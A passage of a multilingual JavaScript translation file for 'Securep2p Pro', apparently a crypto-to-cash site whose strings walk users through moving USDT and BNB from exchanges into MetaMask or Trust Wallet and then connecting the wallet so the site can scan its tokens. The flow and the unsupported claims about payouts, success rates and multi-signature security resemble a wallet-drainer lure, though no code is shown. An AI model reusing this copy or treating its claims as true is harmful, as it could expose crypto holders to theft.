            step3Network: 'Seleção de Rede: Escolha "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" como a rede de saque.',
            step3Warning: "⚠️ Não selecione ERC20 ou TRC20 se você quer usar BSC/BEP20.",
            step3Address: 'Digite seu Endereço de Carteira: Abra Trust Wallet ou MetaMask. Selecione "Smart Chain" (para BSC) ou adicione BSC ao MetaMask se ainda não adicionou. Copie seu endereço BEP20 (começará com 0x...). Cole o endereço no formulário de saque da exchange. Digite o valor do saque (deixe uma pequena quantia para taxas de saque, mostradas na exchange). Complete qualquer verificação 2FA/Segurança. Confirme o saque.',
            step4Title: "4. Sacar BNB (para Taxas de Gas)",
            step4Content: "Repita o processo de saque com BNB: Saque BNB para o mesmo endereço (sua MetaMask/Trust Wallet). Você só precisa de uma pequena quantidade (ex. 0.002 BNB).",
            step5Title: "5. Aguardar Confirmação",
            step5Content: 'A maioria dos saques BEP20 são processados em 2-10 minutos. Verifique sua Trust Wallet/MetaMask para saldos de USDT e BNB sob a rede "Smart Chain"/BSC.',
            step6Title: "6. (Se você tem apenas USDT e nenhum BNB em sua Carteira)",
            step6Content: "Você DEVE ter algum BNB em sua carteira para pagar transações futuras (envio, troca, etc). Se você esqueceu, pode: Comprar BNB na exchange e enviar para sua carteira. Pedir a um amigo para enviar uma pequena quantidade de BNB. Nunca tente mover/trocar tokens BEP20 com 0 BNB em sua carteira – a transação falhará.",
            sampleFlowTitle: "Fluxo de Exemplo – Binance para MetaMask (BEP20 USDT)",
            sampleStep1: "Venda seu outro token por USDT.",
            sampleStep2: "Compre $1 em BNB.",
            sampleStep3: "Saque USDT (BEP20) para seu endereço BSC MetaMask.",
            sampleStep4: "Saque BNB (BEP20) para o mesmo endereço.",
            sampleStep5: "Aguarde ambos chegarem.",
            proTipsTitle: "Dicas Pro",
            proTip1: 'Sempre verifique duas vezes a rede: Para BEP20, a rede é "Binance Smart Chain" (não ERC20, não TRC20).',
            proTip2: "Teste primeiro com uma pequena quantidade (ex. $5) para confirmar o processo de saque.",
            proTip3: "Nunca envie fundos para a rede errada—ativos podem ser perdidos se você enviar para endereços de rede não suportados.",
            proTip4: "Se você ficar preso, verifique seu histórico de saque da exchange e a entrada BSCscan.com da sua carteira (pesquisar por endereço) para status em tempo real."
        }
    },
    it: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Tassi Live",
            "header.connected": "Connesso",
            "header.livePayout": "PAGAMENTO LIVE",
            "header.successful": "Riuscito",
            "header.trading": "Trading",
            "header.pricing": "Prezzi",
            "header.settlement": "Regolamento",
            "trust.totalVolume": "Volume Totale",
            "trust.activeUsers": "Utenti Attivi",
            "trust.successRate": "Tasso di Successo",
            "trust.avgSettlement": "Regolamento Medio",
            "asset.title": "Gestione Asset",
            "asset.subtitle": "Converti i tuoi asset crypto in contanti istantaneamente",
            "asset.connectWallet": "Connetti Portafoglio",
            "asset.connectSubtitle": "Connessione sicura alla rete BSC",
            "asset.connectButton": "Connetti Portafoglio",
            "asset.connecting": "Connessione...",
            "asset.tradeAssets": "Scambia i tuoi Asset",
            "asset.tradeSubtitle": "Seleziona asset da convertire in contanti",
            "asset.scanningAssets": "Scansione dei tuoi Asset",
            "asset.analyzing": "Analizzando il tuo portafoglio per token disponibili...",
            "asset.selectAsset": "Seleziona Asset da Scambiare",
            "asset.chooseAsset": "Scegli un asset dal tuo portafoglio",
            "asset.amountToTrade": "Importo da Scambiare",
            "asset.maxBalance": "Saldo Massimo",
            "asset.amountExceeds": "L'importo supera il saldo disponibile",
            "asset.liveCalculation": "Calcolo Prezzo Live",
            "asset.marketRate": "Basato sui tassi di mercato attuali",
            "asset.enterAmount": "Inserisci importo per vedere il calcolo live",
            "asset.fetchingPrice": "Recupero prezzo live...",
            "asset.youReceive": "Riceverai",
            "asset.usdEquivalent": "Equivalente USD",
            "asset.priceBreakdown": "Dettaglio Prezzo",
            "asset.marketPrice": "Prezzo di Mercato",
            "asset.exchangeMarkup": "Markup Exchange (15%)",
            "asset.totalReceive": "Totale che Riceverai",
            "asset.nextPayout": "Avanti: Scegli Metodo di Pagamento",
            "asset.noAssets": "Nessun Asset Trovato",
            "asset.noAssetsDesc": "Nessun asset negoziabile trovato nel tuo portafoglio",
            "asset.tip": "Suggerimento: Assicurati di avere token nel tuo portafoglio BSC",
            "exchange.transferGuide": "Trasferire da Binance/KuCoin a MetaMask/TrustWallet",
            "exchange.howToTransfer": "Come Trasferire dall'Exchange al Portafoglio",
            "exchange.fromBinance": "Da Binance Exchange",
            "exchange.fromKucoin": "Da KuCoin Exchange",
            "exchange.settingUpWallet": "Configurazione del tuo Portafoglio",
            "exchange.metamaskSetup": "Configurazione MetaMask",
            "exchange.trustwalletSetup": "Configurazione TrustWallet",
            "exchange.importantTips": "Suggerimenti Importanti",
            "exchange.step1": "Login e Navigazione al Portafoglio",
            "exchange.step1Desc": `• Accedi al tuo account Binance
• Vai su "Portafoglio" → "Fiat e Spot"
• Trova la tua crypto (BTC, ETH, USDT, ecc.)`,
            "exchange.step2": "Iniziare il Prelievo",
            "exchange.step2Desc": `• Clicca su "Preleva" accanto alla tua crypto
• Seleziona "Invia tramite Rete Crypto"
• Scegli la rete "BSC (BEP20)" per commissioni più basse`,
            "exchange.step3": "Inserire Indirizzo Portafoglio",
            "exchange.step3Desc": `• Copia il tuo indirizzo BSC MetaMask/TrustWallet
• Incollalo nel campo "Indirizzo Destinatario"
• Ricontrolla che l'indirizzo sia corretto`,
            "exchange.step4": "Completare il Trasferimento",
            "exchange.step4Desc": `• Inserisci l'importo da prelevare
• Rivedi la commissione di rete (solitamente $1-3 su BSC)
• Clicca su "Preleva" e conferma via email/SMS`,
            "exchange.kucoin1": "Accedere agli Asset",
            "exchange.kucoin1Desc": `• Accedi all'account KuCoin
• Vai su "Asset" → "Account Principale"
• Individua la tua criptovaluta`,
            "exchange.kucoin2": "Iniziare il Prelievo",
            "exchange.kucoin2Desc": `• Clicca sul pulsante "Preleva"
• Seleziona "Prelievo On-chain"
• Scegli la rete "BSC" per le migliori tariffe`,
            "exchange.kucoin3": "Aggiungere Indirizzo Portafoglio",
            "exchange.kucoin3Desc": `• Ottieni l'indirizzo BSC del tuo portafoglio
• Incollalo nel campo "Indirizzo di Prelievo"
• Aggiungi l'indirizzo alla whitelist se necessario`,
            "exchange.kucoin4": "Confermare il Prelievo",
            "exchange.kucoin4Desc": `• Inserisci l'importo del prelievo
• Rivedi le commissioni e l'importo finale
• Conferma con verifica 2FA/email`,
            "exchange.metamaskDesc": `• Installa l'estensione browser MetaMask
• Crea nuovo portafoglio o importa esistente
• Aggiungi la rete BSC manualmente:
Rete: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
ID Catena: 56
Simbolo: BNB`,
            "exchange.trustwalletDesc": `• Scarica l'app mobile TrustWallet
• Crea nuovo portafoglio o importa
• La rete BSC è preconfigurata
• Abilita Smart Chain (BNB) nelle impostazioni
• Il tuo indirizzo BSC inizia con "0x..."`,
            "exchange.tip1": "• Usa sempre la rete BSC (BEP20) per le commissioni più basse ($1-3 vs $20-50 su Ethereum)",
            "exchange.tip2": "• Ricontrolla gli indirizzi dei portafogli - i trasferimenti crypto sono irreversibili",
            "exchange.tip3": "• Inizia con piccoli importi per testare prima il processo",
            "exchange.tip4": "• Mantieni del BNB nel tuo portafoglio per le commissioni di transazione",
            "exchange.tip5": "• I trasferimenti richiedono solitamente 1-5 minuti sulla rete BSC",
            "howWorks.title": "Come Funziona",
            "howWorks.choosePayment": "Scegli Metodo di Pagamento",
            "howWorks.choosePaymentDesc": "Seleziona il tuo metodo di pagamento e regione preferiti",
            "howWorks.placeOrder": "Effettua Ordine",
            "howWorks.placeOrderDesc": "Specifica l'importo e conferma i dettagli della transazione",
            "howWorks.processPayment": "Elabora Pagamento",
            "howWorks.processPaymentDesc": "Il nostro sistema elabora i tuoi asset crypto in sicurezza",
            "howWorks.settlement": "Regolamento Istantaneo",
            "howWorks.settlementDesc": "Ricevi fondi tramite il tuo metodo di pagamento scelto in minuti",
            "howWorks.complete": "Transazione Completata",
            "howWorks.completeDesc": "La tua criptovaluta è stata convertita con successo in contanti",
            "howWorks.note": "Nota: Tutte le transazioni sono protette con tecnologia multi-firma",
            "howWorks.support": "Supporto clienti 24/7 disponibile per assistenza",
            "payment.selected": "Selezionato",
            "common.loading": "Caricamento...",
            "common.error": "Errore",
            "common.success": "Successo",
            "common.continue": "Continua",
            "common.back": "Indietro",
            "common.next": "Avanti",
            "common.confirm": "Conferma",
            "common.cancel": "Annulla"
        },
        detailedGuide: {
            step1Title: "1. Converti il tuo Token in USDT",
            step1Subtitle: "(Funziona su tutti gli exchange – Binance, KuCoin, OKX, Bitget, Kraken, ecc.)",
            step1Content: 'Accedi al tuo account exchange (Binance, KuCoin, ecc.). Vai alla sezione "Trade" o "Convert". Seleziona il token che possiedi (es. BTC, ETH). Scegli di scambiare/vendere per USDT (Tether). Conferma il trade. Ora il tuo saldo è in USDT.',
            step1Binance: 'Su Binance: "Convert" > seleziona token > USDT > Convert.',
            step1Kucoin: 'Su KuCoin: "Trade" > Spot > seleziona coppia (es. BTC/USDT) > Vendi per USDT.',
            step1Others: "Su OKX/Bitget/Kraken: Usa Spot/Convert/Trade secondo l'UI.",
            step2Title: "2. Preparati per il Prelievo – Copri le Commissioni BEP20",
            step2Content: "I prelievi BEP20 (Binance Smart Chain) richiedono una piccola quantità di BNB nel tuo wallet per pagare le commissioni gas. Alcuni exchange deducono automaticamente BNB dal tuo prelievo, ma molti inviano solo USDT—dovrai inviare manualmente un po' di BNB per le transazioni future.",
            step2Action: 'Cosa fare: Compra ~$1 di valore in BNB (0.002 BNB è solitamente sufficiente per molti trasferimenti). Come sopra: Vai su "Trade"/"Convert", compra BNB con USDT.',
            step3Title: "3. Preleva USDT (BEP20) su Trust Wallet/MetaMask",
            step3Content: 'Vai su "Wallet" o "Assets" sul tuo exchange. Trova USDT, clicca "Withdraw" o "Send".',
            step3Network: 'Selezione Rete: Scegli "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" come rete di prelievo.',
            step3Warning: "⚠️ Non selezionare ERC20 o TRC20 se vuoi usare BSC/BEP20.",
            step3Address: `Inserisci il tuo Indirizzo Wallet: Apri Trust Wallet o MetaMask. Seleziona "Smart Chain" (per BSC) o aggiungi BSC a MetaMask se non già fatto. Copia il tuo indirizzo BEP20 (inizierà con 0x...). Incolla l'indirizzo nel modulo di prelievo dell'exchange. Inserisci l'importo del prelievo (lascia una piccola quantità per le commissioni di prelievo, mostrate sull'exchange). Completa qualsiasi controllo 2FA/Sicurezza. Conferma il prelievo.`,
            step4Title: "4. Preleva BNB (per Commissioni Gas)",
            step4Content: "Ripeti il processo di prelievo con BNB: Preleva BNB allo stesso indirizzo (il tuo MetaMask/Trust Wallet). Hai bisogno solo di una piccola quantità (es. 0.002 BNB).",
            step5Title: "5. Aspetta la Conferma",
            step5Content: 'La maggior parte dei prelievi BEP20 vengono elaborati entro 2-10 minuti. Controlla il tuo Trust Wallet/MetaMask per i saldi USDT e BNB sotto la rete "Smart Chain"/BSC.',
            step6Title: "6. (Se hai solo USDT e nessun BNB nel tuo Wallet)",
            step6Content: "DEVI avere del BNB nel tuo wallet per pagare le transazioni future (invio, scambio, ecc). Se hai dimenticato, puoi: Comprare BNB sull'exchange e inviarlo al tuo wallet. Chiedere a un amico di inviarti una piccola quantità di BNB. Non provare mai a spostare/scambiare token BEP20 con 0 BNB nel tuo wallet – la transazione fallirà.",
            sampleFlowTitle: "Flusso di Esempio – Binance a MetaMask (BEP20 USDT)",
            sampleStep1: "Vendi il tuo altro token per USDT.",
            sampleStep2: "Compra $1 di BNB.",
            sampleStep3: "Preleva USDT (BEP20) al tuo indirizzo BSC MetaMask.",
            sampleStep4: "Preleva BNB (BEP20) allo stesso indirizzo.",
            sampleStep5: "Aspetta che arrivino entrambi.",
            proTipsTitle: "Consigli Pro",
            proTip1: 'Controlla sempre due volte la rete: Per BEP20, la rete è "Binance Smart Chain" (non ERC20, non TRC20).',
            proTip2: "Testa prima con una piccola quantità (es. $5) per confermare il processo di prelievo.",
            proTip3: "Non inviare mai fondi alla rete sbagliata—gli asset potrebbero essere persi se invii a indirizzi di rete non supportati.",
            proTip4: "Se rimani bloccato, controlla la cronologia dei prelievi del tuo exchange e l'entry BSCscan.com del tuo wallet (cerca per indirizzo) per lo stato in tempo reale."
        }
    },
    nl: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Live Koersen",
            "header.connected": "Verbonden",
            "header.livePayout": "LIVE UITBETALING",
            "header.successful": "Succesvol",
            "header.trading": "Handelen",
            "header.pricing": "Prijsstelling",
            "header.settlement": "Afwikkeling",
            "trust.totalVolume": "Totaal Volume",
            "trust.activeUsers": "Actieve Gebruikers",
            "trust.successRate": "Succespercentage",
            "trust.avgSettlement": "Gem. Afwikkeling",
            "asset.title": "Asset Beheer",
            "asset.subtitle": "Converteer je crypto assets direct naar contant geld",
            "asset.connectWallet": "Portemonnee Verbinden",
            "asset.connectSubtitle": "Veilige verbinding met BSC netwerk",
            "asset.connectButton": "Portemonnee Verbinden",
            "asset.connecting": "Verbinden...",
            "asset.tradeAssets": "Handel je Assets",
            "asset.tradeSubtitle": "Selecteer assets om te converteren naar contant geld",
            "asset.scanningAssets": "Je Assets Scannen",
            "asset.analyzing": "Je portemonnee analyseren voor beschikbare tokens...",
            "asset.selectAsset": "Selecteer Asset om te Handelen",
            "asset.chooseAsset": "Kies een asset uit je portemonnee",
            "asset.amountToTrade": "Bedrag om te Handelen",
            "asset.maxBalance": "Max Saldo",
            "asset.amountExceeds": "Bedrag overschrijdt beschikbaar saldo",
            "asset.liveCalculation": "Live Prijsberekening",
            "asset.marketRate": "Gebaseerd op huidige marktkoersen",
            "asset.enterAmount": "Voer bedrag in om live berekening te zien",
            "asset.fetchingPrice": "Live prijs ophalen...",
            "asset.youReceive": "Je Ontvangt",
            "asset.usdEquivalent": "USD Equivalent",
            "asset.priceBreakdown": "Prijsoverzicht",
            "asset.marketPrice": "Marktprijs",
            "asset.exchangeMarkup": "Exchange Opslag (15%)",
            "asset.totalReceive": "Totaal dat Je Ontvangt",
            "asset.nextPayout": "Volgende: Kies Uitbetalingsmethode",
            "asset.noAssets": "Geen Assets Gevonden",
            "asset.noAssetsDesc": "Geen verhandelbare assets gevonden in je portemonnee",
            "asset.tip": "Tip: Zorg ervoor dat je tokens hebt in je BSC portemonnee",
            "exchange.transferGuide": "Overzetten van Binance/KuCoin naar MetaMask/TrustWallet",
            "exchange.howToTransfer": "Hoe Over te Zetten van Exchange naar Portemonnee",
            "exchange.fromBinance": "Van Binance Exchange",
            "exchange.fromKucoin": "Van KuCoin Exchange",
            "exchange.settingUpWallet": "Je Portemonnee Instellen",
            "exchange.metamaskSetup": "MetaMask Instelling",
            "exchange.trustwalletSetup": "TrustWallet Instelling",
            "exchange.importantTips": "Belangrijke Tips",
            "exchange.step1": "Inloggen en Navigeren naar Portemonnee",
            "exchange.step1Desc": `• Log in op je Binance account
• Ga naar "Portemonnee" → "Fiat en Spot"
• Vind je crypto (BTC, ETH, USDT, etc.)`,
            "exchange.step2": "Opname Starten",
            "exchange.step2Desc": `• Klik op "Opnemen" naast je crypto
• Selecteer "Verzenden via Crypto Netwerk"
• Kies "BSC (BEP20)" netwerk voor lagere kosten`,
            "exchange.step3": "Portemonnee Adres Invoeren",
            "exchange.step3Desc": `• Kopieer je MetaMask/TrustWallet BSC adres
• Plak het in het "Ontvanger Adres" veld
• Controleer het adres nogmaals`,
            "exchange.step4": "Overdracht Voltooien",
            "exchange.step4Desc": `• Voer het opnamebedrag in
• Bekijk de netwerkkosten (meestal $1-3 op BSC)
• Klik op "Opnemen" en bevestig via email/SMS`,
            "exchange.kucoin1": "Toegang tot Assets",
            "exchange.kucoin1Desc": `• Log in op KuCoin account
• Ga naar "Assets" → "Hoofdaccount"
• Zoek je cryptocurrency`,
            "exchange.kucoin2": "Opname Starten",
            "exchange.kucoin2Desc": `• Klik op "Opnemen" knop
• Selecteer "On-chain Opname"
• Kies "BSC" netwerk voor beste tarieven`,
            "exchange.kucoin3": "Portemonnee Adres Toevoegen",
            "exchange.kucoin3Desc": `• Verkrijg je portemonnee BSC adres
• Plak in "Opname Adres" veld
• Voeg adres toe aan whitelist indien nodig`,
            "exchange.kucoin4": "Opname Bevestigen",
            "exchange.kucoin4Desc": `• Voer opnamebedrag in
• Bekijk kosten en eindbedrag
• Bevestig met 2FA/email verificatie`,
            "exchange.metamaskDesc": `• Installeer MetaMask browser extensie
• Maak nieuwe portemonnee of importeer bestaande
• Voeg BSC netwerk handmatig toe:
Netwerk: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
Keten ID: 56
Symbool: BNB`,
            "exchange.trustwalletDesc": `• Download TrustWallet mobiele app
• Maak nieuwe portemonnee of importeer
• BSC netwerk is vooraf geconfigureerd
• Schakel Smart Chain (BNB) in bij instellingen
• Je BSC adres begint met "0x..."`,
            "exchange.tip1": "• Gebruik altijd BSC (BEP20) netwerk voor laagste kosten ($1-3 vs $20-50 op Ethereum)",
            "exchange.tip2": "• Controleer portemonnee adressen nogmaals - crypto overdrachten zijn onomkeerbaar",
            "exchange.tip3": "• Begin met kleine bedragen om het proces eerst te testen",
            "exchange.tip4": "• Houd wat BNB in je portemonnee voor transactiekosten",
            "exchange.tip5": "• Overdrachten duren meestal 1-5 minuten op BSC netwerk",
            "howWorks.title": "Hoe Het Werkt",
            "howWorks.choosePayment": "Kies Betaalmethode",
            "howWorks.choosePaymentDesc": "Selecteer je gewenste uitbetalingsmethode en regio",
            "howWorks.placeOrder": "Plaats je Bestelling",
            "howWorks.placeOrderDesc": "Specificeer het bedrag en bevestig transactiedetails",
            "howWorks.processPayment": "Verwerk Betaling",
            "howWorks.processPaymentDesc": "Ons systeem verwerkt je crypto assets veilig",
            "howWorks.settlement": "Directe Afwikkeling",
            "howWorks.settlementDesc": "Ontvang geld via je gekozen betaalmethode binnen minuten",
            "howWorks.complete": "Transactie Voltooid",
            "howWorks.completeDesc": "Je cryptocurrency is succesvol geconverteerd naar contant geld",
            "howWorks.note": "Opmerking: Alle transacties zijn beveiligd met multi-handtekening technologie",
            "howWorks.support": "24/7 klantenservice beschikbaar voor hulp",
            "payment.selected": "Geselecteerd",
            "common.loading": "Laden...",
            "common.error": "Fout",
            "common.success": "Succes",
            "common.continue": "Doorgaan",
            "common.back": "Terug",
            "common.next": "Volgende",
            "common.confirm": "Bevestigen",
            "common.cancel": "Annuleren"
        },
        detailedGuide: {
            step1Title: "1. Converteer je Token naar USDT",
            step1Subtitle: "(Werkt op alle exchanges – Binance, KuCoin, OKX, Bitget, Kraken, etc.)",
            step1Content: 'Log in op je exchange account (Binance, KuCoin, etc.). Ga naar de "Trade" of "Convert" sectie. Selecteer de token die je hebt (bijv. BTC, ETH). Kies om te ruilen/verkopen voor USDT (Tether). Bevestig de trade. Nu is je saldo in USDT.',
            step1Binance: 'Op Binance: "Convert" > selecteer token > USDT > Convert.',
            step1Kucoin: 'Op KuCoin: "Trade" > Spot > selecteer paar (bijv. BTC/USDT) > Verkoop voor USDT.',
            step1Others: "Op OKX/Bitget/Kraken: Gebruik Spot/Convert/Trade volgens de UI.",
            step2Title: "2. Bereid je voor op Opname – Dek BEP20 Kosten",
            step2Content: "BEP20 (Binance Smart Chain) opnames vereisen een kleine hoeveelheid BNB in je wallet om gaskosten te betalen. Sommige exchanges trekken automatisch BNB af van je opname, maar velen sturen alleen USDT—je moet handmatig wat BNB sturen voor toekomstige transacties.",
            step2Action: 'Wat te doen: Koop ~$1 waarde aan BNB (0.002 BNB is meestal genoeg voor veel transfers). Zoals hierboven: Ga naar "Trade"/"Convert", koop BNB met USDT.',
            step3Title: "3. USDT (BEP20) Opnemen naar Trust Wallet/MetaMask",
            step3Content: 'Ga naar "Wallet" of "Assets" op je exchange. Vind USDT, klik "Withdraw" of "Send".',
            step3Network: 'Netwerk Selectie: Kies "BEP20 (BSC)" / "Binance Smart Chain (BEP20)" als het opname netwerk.',
            step3Warning: "⚠️ Selecteer geen ERC20 of TRC20 als je BSC/BEP20 wilt gebruiken.",
            step3Address: 'Voer je Wallet Adres in: Open Trust Wallet of MetaMask. Selecteer "Smart Chain" (voor BSC) of voeg BSC toe aan MetaMask als nog niet gedaan. Kopieer je BEP20 adres (begint met 0x...). Plak het adres in het exchange opname formulier. Voer het opname bedrag in (laat een klein bedrag over voor opname kosten, getoond op de exchange). Voltooi eventuele 2FA/Beveiligings controles. Bevestig de opname.',
            step4Title: "4. BNB Opnemen (voor Gas Kosten)",
            step4Content: "Herhaal het opname proces met BNB: Neem BNB op naar hetzelfde adres (je MetaMask/Trust Wallet). Je hebt maar een kleine hoeveelheid nodig (bijv. 0.002 BNB).",
            step5Title: "5. Wacht op Bevestiging",
            step5Content: 'De meeste BEP20 opnames worden binnen 2-10 minuten verwerkt. Controleer je Trust Wallet/MetaMask voor USDT en BNB saldi onder het "Smart Chain"/BSC netwerk.',
            step6Title: "6. (Als je alleen USDT hebt en geen BNB in je Wallet)",
            step6Content: "Je MOET wat BNB in je wallet hebben om toekomstige transacties te betalen (verzenden, ruilen, etc). Als je het vergeten bent, kun je: BNB kopen op de exchange en naar je wallet sturen. Een vriend vragen om je een kleine hoeveelheid BNB te sturen. Probeer nooit BEP20 tokens te verplaatsen/ruilen met 0 BNB in je wallet – de transactie zal falen.",
            sampleFlowTitle: "Voorbeeld Flow – Binance naar MetaMask (BEP20 USDT)",
            sampleStep1: "Verkoop je andere token voor USDT.",
            sampleStep2: "Koop $1 aan BNB.",
            sampleStep3: "Neem USDT (BEP20) op naar je MetaMask BSC adres.",
            sampleStep4: "Neem BNB (BEP20) op naar hetzelfde adres.",
            sampleStep5: "Wacht tot beide aankomen.",
            proTipsTitle: "Pro Tips",
            proTip1: 'Controleer altijd dubbel het netwerk: Voor BEP20 is het netwerk "Binance Smart Chain" (niet ERC20, niet TRC20).',
            proTip2: "Test eerst met een klein bedrag (bijv. $5) om het opname proces te bevestigen.",
            proTip3: "Stuur nooit geld naar het verkeerde netwerk—assets kunnen verloren gaan als je naar niet-ondersteunde netwerk adressen stuurt.",
            proTip4: "Als je vastloopt, controleer je exchange opname geschiedenis en je wallet's BSCscan.com entry (zoek op adres) voor real-time status."
        }
    },
    tr: {
        translation: {
            "header.title": "Securep2p Pro",
            "header.liveRates": "Canlı Oranlar",
            "header.connected": "Bağlandı",
            "header.livePayout": "CANLI ÖDEME",
            "header.successful": "Başarılı",
            "header.trading": "Ticaret",
            "header.pricing": "Fiyatlandırma",
            "header.settlement": "Uzlaşma",
            "trust.totalVolume": "Toplam Hacim",
            "trust.activeUsers": "Aktif Kullanıcılar",
            "trust.successRate": "Başarı Oranı",
            "trust.avgSettlement": "Ort. Uzlaşma",
            "asset.title": "Varlık Yönetimi",
            "asset.subtitle": "Kripto varlıklarınızı anında nakde dönüştürün",
            "asset.connectWallet": "Cüzdanınızı Bağlayın",
            "asset.connectSubtitle": "BSC ağına güvenli bağlantı",
            "asset.connectButton": "Cüzdan Bağla",
            "asset.connecting": "Bağlanıyor...",
            "asset.tradeAssets": "Varlıklarınızı Takas Edin",
            "asset.tradeSubtitle": "Nakde dönüştürmek için varlık seçin",
            "asset.scanningAssets": "Varlıklarınız Taranıyor",
            "asset.analyzing": "Mevcut tokenlar için cüzdanınız analiz ediliyor...",
            "asset.selectAsset": "Takas Edilecek Varlığı Seçin",
            "asset.chooseAsset": "Cüzdanınızdan bir varlık seçin",
            "asset.amountToTrade": "Takas Edilecek Miktar",
            "asset.maxBalance": "Maksimum Bakiye",
            "asset.amountExceeds": "Miktar mevcut bakiyeyi aşıyor",
            "asset.liveCalculation": "Canlı Fiyat Hesaplama",
            "asset.marketRate": "Mevcut piyasa oranlarına dayalı",
            "asset.enterAmount": "Canlı hesaplama görmek için miktar girin",
            "asset.fetchingPrice": "Canlı fiyat alınıyor...",
            "asset.youReceive": "Alacağınız",
            "asset.usdEquivalent": "USD Karşılığı",
            "asset.priceBreakdown": "Fiyat Dökümü",
            "asset.marketPrice": "Piyasa Fiyatı",
            "asset.exchangeMarkup": "Borsa Kar Marjı (15%)",
            "asset.totalReceive": "Toplam Alacağınız",
            "asset.nextPayout": "Sonraki: Ödeme Yöntemi Seçin",
            "asset.noAssets": "Varlık Bulunamadı",
            "asset.noAssetsDesc": "Cüzdanınızda takas edilebilir varlık bulunamadı",
            "asset.tip": "İpucu: BSC cüzdanınızda token olduğundan emin olun",
            "exchange.transferGuide": "Binance/KuCoin'den MetaMask/TrustWallet'a Transfer",
            "exchange.howToTransfer": "Borsadan Cüzdana Nasıl Transfer Edilir",
            "exchange.fromBinance": "Binance Borsasından",
            "exchange.fromKucoin": "KuCoin Borsasından",
            "exchange.settingUpWallet": "Cüzdanınızı Kurma",
            "exchange.metamaskSetup": "MetaMask Kurulumu",
            "exchange.trustwalletSetup": "TrustWallet Kurulumu",
            "exchange.importantTips": "Önemli İpuçları",
            "exchange.step1": "Giriş Yapın ve Cüzdana Gidin",
            "exchange.step1Desc": `• Binance hesabınıza giriş yapın
• "Cüzdan" → "Fiat ve Spot"a gidin
• Kripto paranızı bulun (BTC, ETH, USDT, vb.)`,
            "exchange.step2": "Çekimi Başlatın",
            "exchange.step2Desc": `• Kripto paranızın yanındaki "Çek"e tıklayın
• "Kripto Ağı ile Gönder"i seçin
• Düşük ücretler için "BSC (BEP20)" ağını seçin`,
            "exchange.step3": "Cüzdan Adresini Girin",
            "exchange.step3Desc": `• MetaMask/TrustWallet BSC adresinizi kopyalayın
• "Alıcı Adresi" alanına yapıştırın
• Adresin doğru olduğunu tekrar kontrol edin`,
            "exchange.step4": "Transferi Tamamlayın",
            "exchange.step4Desc": `• Çekim miktarını girin
• Ağ ücretini inceleyin (BSC'de genellikle $1-3)
• "Çek"e tıklayın ve email/SMS ile onaylayın`,
            "exchange.kucoin1": "Varlıklara Erişin",
            "exchange.kucoin1Desc": `• KuCoin hesabına giriş yapın
• "Varlıklar" → "Ana Hesap"a gidin
• Kripto paranızı bulun`,
            "exchange.kucoin2": "Çekimi Başlatın",
            "exchange.kucoin2Desc": `• "Çek" butonuna tıklayın
• "Zincir Üstü Çekim"i seçin
• En iyi oranlar için "BSC" ağını seçin`,
            "exchange.kucoin3": "Cüzdan Adresi Ekleyin",
            "exchange.kucoin3Desc": `• Cüzdanınızın BSC adresini alın
• "Çekim Adresi" alanına yapıştırın
• Gerekirse adresi beyaz listeye ekleyin`,
            "exchange.kucoin4": "Çekimi Onaylayın",
            "exchange.kucoin4Desc": `• Çekim miktarını girin
• Ücretleri ve son miktarı inceleyin
• 2FA/email doğrulaması ile onaylayın`,
            "exchange.metamaskDesc": `• MetaMask tarayıcı uzantısını yükleyin
• Yeni cüzdan oluşturun veya mevcut olanı içe aktarın
• BSC ağını manuel olarak ekleyin:
Ağ: BSC Mainnet
RPC: https://bsc-dataseed.binance.org/
Zincir ID: 56
Sembol: BNB`,
            "exchange.trustwalletDesc": `• TrustWallet mobil uygulamasını indirin
• Yeni cüzdan oluşturun veya içe aktarın
• BSC ağı önceden yapılandırılmıştır
• Ayarlarda Smart Chain (BNB)'yi etkinleştirin
• BSC adresiniz "0x..." ile başlar`,
            "exchange.tip1": "• En düşük ücretler için her zaman BSC (BEP20) ağını kullanın (Ethereum'da $20-50'ye karşı $1-3)",
            "exchange.tip2": "• Cüzdan adreslerini tekrar kontrol edin - kripto transferleri geri alınamaz",
            "exchange.tip3": "• Önce süreci test etmek için küçük miktarlarla başlayın",
            "exchange.tip4": "• İşlem ücretleri için cüzdanınızda biraz BNB bulundurun",
            "exchange.tip5": "• Transferler genellikle BSC ağında 1-5 dakika sürer",
            "howWorks.title": "Nasıl Çalışır",
            "howWorks.choosePayment": "Ödeme Yöntemi Seçin",
            "howWorks.choosePaymentDesc": "Tercih ettiğiniz ödeme yöntemi ve bölgeyi seçin",
            "howWorks.placeOrder": "Siparişinizi Verin",
            "howWorks.placeOrderDesc": "Miktarı belirtin ve işlem detaylarını onaylayın",
            "howWorks.processPayment": "Ödemeyi İşle",
            "howWorks.processPaymentDesc": "Sistemimiz kripto varlıklarınızı güvenle işler",
            "howWorks.settlement": "Anında Uzlaşma",
            "howWorks.settlementDesc": "Seçtiğiniz ödeme yöntemiyle dakikalar içinde para alın",
            "howWorks.complete": "İşlem Tamamlandı",
            "howWorks.completeDesc": "Kripto paranız başarıyla nakde dönüştürüldü",
            "howWorks.note": "Not: Tüm işlemler çoklu imza teknolojisiyle güvence altına alınmıştır",
            "howWorks.support": "Yardım için 7/24 müşteri desteği mevcut",
            "payment.selected": "Seçildi",
            "common.loading": "Yükleniyor...",
            "common.error": "Hata",
            "common.success": "Başarı",
            "common.continue": "Devam Et",
            "common.back": "Geri",
            "common.next": "İleri",
            "common.confirm": "Onayla",
            "common.cancel": "İptal"
        },
        detailedGuide: {
            step1Title: "1. Token'ınızı USDT'ye Dönüştürün",
            step1Subtitle: "(Tüm borsalarda çalışır – Binance, KuCoin, OKX, Bitget, Kraken, vb.)",
            step1Content: `Borsa hesabınıza giriş yapın (Binance, KuCoin, vb.). "Trade" veya "Convert" bölümüne gidin. Sahip olduğunuz token'ı seçin (örn. BTC, ETH). USDT (Tether) ile takas/satış yapmayı seçin. İşlemi onaylayın. Artık bakiyeniz USDT'de.`,
            step1Binance: `Binance'de: "Convert" > token seç > USDT > Convert.`,
            step1Kucoin: `KuCoin'de: "Trade" > Spot > çift seç (örn. BTC/USDT) > USDT karşılığında sat.`,
            step1Others: "OKX/Bitget/Kraken'de: UI'ye göre Spot/Convert/Trade kullanın.",
            step2Title: "2. Çekme İçin Hazırlanın – BEP20 Ücretlerini Karşılayın",
